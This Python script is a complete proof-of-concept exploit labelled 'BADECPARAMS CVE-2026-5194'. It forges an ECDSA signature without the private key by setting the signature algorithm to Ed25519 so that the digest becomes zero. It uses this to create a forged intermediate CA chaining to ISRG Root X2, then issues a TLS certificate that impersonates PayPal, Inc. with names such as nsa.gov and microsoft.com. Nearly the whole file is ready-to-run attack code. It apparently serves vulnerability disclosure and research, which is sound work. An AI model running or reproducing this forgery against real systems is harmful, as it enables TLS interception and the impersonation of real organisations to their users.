#!/usr/bin/env python3
import datetime
import hashlib
import os
import subprocess
import sys
from typing import BinaryIO, Iterable, Optional, Sequence, Tuple

import ecdsa.curves
import ecdsa.ellipticcurve
import ecdsa.numbertheory
import ecdsa.util
from asn1crypto import core, keys, pem, x509

OPENSSL = "openssl"


def load_certificate_chain(filename: str) -> Iterable[x509.Certificate]:
    with open(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), filename), "rb"
    ) as f:
        pem_bytes = f.read()

    for object_type, _, der_bytes in pem.unarmor(pem_bytes, multiple=True):
        if object_type != "CERTIFICATE":
            continue
        yield x509.Certificate.load(der_bytes)


def digest_certificate(certificate: x509.Certificate) -> bytes:
    der_bytes = certificate["tbs_certificate"].dump()
    return hashlib.new(certificate.hash_algo, der_bytes).digest()


def sign_certificate(
    signing_key: ecdsa.keys.SigningKey, certificate: x509.Certificate
) -> None:
    digest = digest_certificate(certificate)
    signature_bytes = signing_key.sign_digest(
        digest, sigencode=ecdsa.util.sigencode_der
    )
    certificate["signature_value"] = signature_bytes


def exploit_ecdsa_signature(public_key: keys.PublicKeyInfo) -> bytes:
    """Forge ECDSA signature that passes verification for this public key.

    sigOID=Ed25519 makes hashing a no-op (digestSz=0), so e=0.
    With e=0: pick k, r=(k*Q).x mod n, s=r*k^{-1} mod n — verifies using Q only.
    """
    curve = ecdsa.curves.curve_by_name(
        public_key["algorithm"]["parameters"].chosen.native
    )
    Qx, Qy = public_key["public_key"].to_coords()
    Q = ecdsa.ellipticcurve.Point(curve.curve, Qx, Qy, curve.order)

    while True:
        k = ecdsa.util.randrange(curve.order)
        P = k * Q
        r = P.x() % curve.order
        if r == 0:
            continue
        k_inverse = ecdsa.numbertheory.inverse_mod(k, curve.order)
        s = (r * k_inverse) % curve.order
        if s == 0:
            continue
        return ecdsa.util.sigencode_der(r, s, curve.order)


def exploit_certificate(
    ca_cert: x509.Certificate,
) -> Tuple[x509.Certificate, ecdsa.keys.SigningKey, keys.PrivateKeyInfo]:
    """Forge an intermediate CA certificate.

    signatureAlgorithm=Ed25519 triggers the e=0 path; signature forged via exploit_ecdsa_signature.
    """
    private_key, public_key = generate_private_key("EC", ec_paramgen_curve="P-256")
    signing_key = ecdsa.keys.SigningKey.from_der(private_key.dump())

    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "ed25519"})
    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert.subject,
                "validity": {
                    "not_before": x509.UTCTime(
                        datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                    "not_after": x509.UTCTime(
                        datetime.datetime(2030, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                },
                "subject": x509.Name.build({"common_name": get_name("Forged CA")}),
                "subject_public_key_info": public_key,
                "extensions": [
                    {
                        "extn_id": "basic_constraints",
                        "critical": True,
                        "extn_value": {"ca": True},
                    },
                    {
                        "extn_id": "key_usage",
                        "critical": True,
                        "extn_value": {"key_cert_sign"},
                    },
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
            "signature_value": exploit_ecdsa_signature(ca_cert.public_key),
        }
    )

    return certificate, signing_key, private_key


def write_pem(f: BinaryIO, value: core.Asn1Value, object_type: str) -> None:
    print("Writing {} to {!r}".format(object_type, f.name), file=sys.stderr)
    der_bytes = value.dump()
    pem_bytes = pem.armor(object_type, der_bytes)
    f.write(pem_bytes)


def generate_private_key(
    algorithm: str, **kwargs: object,
) -> Tuple[keys.PrivateKeyInfo, keys.PublicKeyInfo]:
    genpkey_args = [OPENSSL, "genpkey", "-algorithm", algorithm, "-outform", "DER"]
    for opt, value in kwargs.items():
        genpkey_args.extend(("-pkeyopt", "{}:{}".format(opt, value)))

    private_key_bytes = subprocess.check_output(genpkey_args)
    private_key = keys.PrivateKeyInfo.load(private_key_bytes)

    public_key_bytes = subprocess.check_output(
        (OPENSSL, "pkey", "-pubout", "-inform", "DER", "-outform", "DER"),
        input=private_key_bytes,
    )
    public_key = keys.PublicKeyInfo.load(public_key_bytes)

    return private_key, public_key


def random_serial_number() -> int:
    return int.from_bytes(os.urandom(20), "big") >> 1


def write_tls_certificate(
    ca_cert: x509.Certificate,
    ca_cert_issuer: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
    name: str,
    subject: x509.Name,
    subject_alt_names: Sequence[str],
) -> None:
    private_key, public_key = generate_private_key("RSA", rsa_keygen_bits=4096)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})

    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert.subject,
                "validity": {
                    "not_before": x509.UTCTime(
                        datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                    "not_after": x509.UTCTime(
                        datetime.datetime(2030, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                },
                "subject": subject,
                "subject_public_key_info": public_key,
                "extensions": [
                    {
                        "extn_id": "basic_constraints",
                        "critical": True,
                        "extn_value": {"ca": False},
                    },
                    {
                        "extn_id": "subject_alt_name",
                        "critical": False,
                        "extn_value": [
                            x509.GeneralName({"dns_name": dns_name})
                            for dns_name in subject_alt_names
                        ],
                    },
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
        }
    )

    sign_certificate(signing_key, certificate)

    with open(name + ".crt", "wb") as f:
        write_pem(f, certificate, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")
        write_pem(f, ca_cert_issuer, "CERTIFICATE")

    with open(name + ".key", "wb") as f:
        write_pem(f, private_key, "RSA PRIVATE KEY")
        write_pem(f, certificate, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")
        write_pem(f, ca_cert_issuer, "CERTIFICATE")


def get_name(purpose: Optional[str] = None) -> str:
    components = ["BADECPARAMS CVE-2026-5194", "(Saleem Rashid @saleemrash1d)"]
    if purpose:
        components.insert(1, purpose)
    return " ".join(components)


def main() -> None:
    (ca_cert_issuer,) = load_certificate_chain("isrg-root-x2.pem")

    ca_cert, signing_key, private_key = exploit_certificate(ca_cert_issuer)

    with open("intermediateCA.crt", "wb") as f:
        write_pem(f, ca_cert_issuer, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")

    with open("intermediateCA.key", "wb") as f:
        write_pem(f, private_key, "PRIVATE KEY")

    write_tls_certificate(
        ca_cert,
        ca_cert_issuer,
        signing_key,
        "localhost",
        x509.Name.build(
            {
                "incorporation_country": "US",
                "business_category": "Private Organization",
                "serial_number": "1",
                "country_name": "US",
                "common_name": get_name("EV Certificate"),
                "organization_name": "PayPal, Inc.",
                "organizational_unit_name": get_name("EV Certificate"),
            }
        ),
        ("localhost", "nsa.gov", "www.nsa.gov", "microsoft.com", "www.microsoft.com"),
    )


if __name__ == "__main__":
    main()
